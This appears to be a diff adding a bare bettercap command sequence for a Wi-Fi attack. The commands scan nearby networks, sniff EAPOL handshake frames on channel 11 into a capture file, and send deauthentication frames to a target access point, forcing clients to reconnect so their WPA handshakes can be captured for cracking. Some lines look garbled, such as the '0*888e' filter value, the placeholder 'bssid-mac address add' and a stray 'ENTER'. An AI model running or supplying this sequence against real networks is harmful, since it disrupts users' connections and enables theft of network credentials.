@@ -1,0 +1,19 @@
+bettercap -iface wlan0mon
+
+wifi.recon on
+
+wifi.show
+
+wifi.recon.channel 11
+
+set net.sniff.verbose true
+
+set net.sniff filter ether proto 0*888e
+
+set net.sniff.output wifi.pcap
+
+set net.sniff on
+
+wifi.deauth bssid-mac address add
+
+ENTER
